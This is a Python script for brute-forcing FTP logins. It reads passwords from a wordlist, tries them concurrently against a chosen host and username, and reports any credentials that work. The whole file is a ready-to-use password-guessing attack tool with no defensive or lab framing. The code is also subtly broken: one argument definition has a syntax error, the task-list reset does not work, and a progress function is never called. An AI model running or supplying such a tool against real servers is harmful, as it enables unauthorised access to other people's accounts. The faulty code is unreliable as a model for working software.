import asyncio
import argparse
from termcolor import colored
from datetime import datetime
from os import path
import aioftp

async def ftp_bruteforce(hostname, username, password, port, found_flag):
    """Takes password, username, port as input and checks for connection"""
    try:
        async with aioftp.Client.context(hostname, user=username, password=password, port=port) as client:
            found_flag.set()
            print(colored(
                f"[{port}] [ftp] host:{hostname}  login:{username}  password:{password}", 'green'))

    except Exception as err:
        print(
            f"[Attempt] target {hostname} - login:{username} - password:{password}")

async def process_password(hostname, username, password, port, found_flag, tasks, concurrency_limit):
    """Processes a single password attempt"""
    if len(tasks) >= concurrency_limit:
        await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
        tasks = []

    if not found_flag.is_set():
        task = asyncio.create_task(ftp_bruteforce(
            hostname, username, password, port, found_flag))
        tasks.append(task)

async def main(hostname, port, username, wordlist, concurrency_limit):
    """The Main function takes hostname, port, username, wordlist, and defines concurrency limit"""
    tasks = []
    found_flag = asyncio.Event()

    with open(wordlist, 'r', encoding='latin-1') as f:
        passwords = (password.strip() for password in f)

        for password in passwords:
            try:
                await process_password(hostname, username, password, port, found_flag, tasks, concurrency_limit)
                await asyncio.sleep(5)  # Introduce a 5-second gap between attempts
            except KeyboardInterrupt:
                print("\n\nReceived keyboard interrupt. Exiting.")
                return

    await asyncio.gather(*tasks)

    if not found_flag.is_set():
        print(colored("\n [-] Failed to find the correct password.", "red"))

def get_args():
    """Function to get command-line arguments"""
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='Host to attack on e.g. 192.168.1.1')
    parser.add_argument('-p', '--port', dest='port', default=21, type=int, required=False, help="Port to attack on, Default:21")
    parser.add_argument('-w', '--wordlist', dest='wordlist', required=True, type=str help="Path to the Wordlist")
    parser.add_argument('-u', '--username', dest='username', required=True, help="Username with which to bruteforce")
    parser.add_argument('-c', '--concurrency', dest='concurrency', default=10, type=int, required=False, help="Concurrency limit, Default:10")
    arguments = parser.parse_args()
    return arguments

async def display_progress():
    """Function to display progress"""
    while True:
        await asyncio.sleep(1)
        print(".", end='', flush=True)

if __name__ == "__main__":
    arguments = get_args()

    if not path.exists(arguments.wordlist):
        print(colored(
            "[-] Wordlist location is not right,\n[-] Provide the right path of the wordlist", 'red'))
        exit(1)

    print("\n---------------------------------------------------------\n---------------------------------------------------------")
    print(colored(f"[*] Target\t: {arguments.target}", "red"))
    print(colored(f"[*] Username\t: {arguments.username}", "red"))
    print(colored(f"[*] Port\t: {arguments.port}", "red"))
    print(colored(f"[*] Wordlist\t: {arguments.wordlist}", "red"))
    print(colored(f"[*] Protocol\t: FTP", "red"))

    print("---------------------------------------------------------\n---------------------------------------------------------", )

    print(colored(
        f"FTP-Bruteforcer starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
    print("---------------------------------------------------------\n---------------------------------------------------------")

    try:
        asyncio.run(main(arguments.target, arguments.port, arguments.username, arguments.wordlist, arguments.concurrency))
    except KeyboardInterrupt:
        print("\n\nReceived keyboard interrupt. Exiting.")
    finally:
        print("\n---------------------------------------------------------\n---------------------------------------------------------")
        print(colored("Bruteforce completed.", "yellow"))
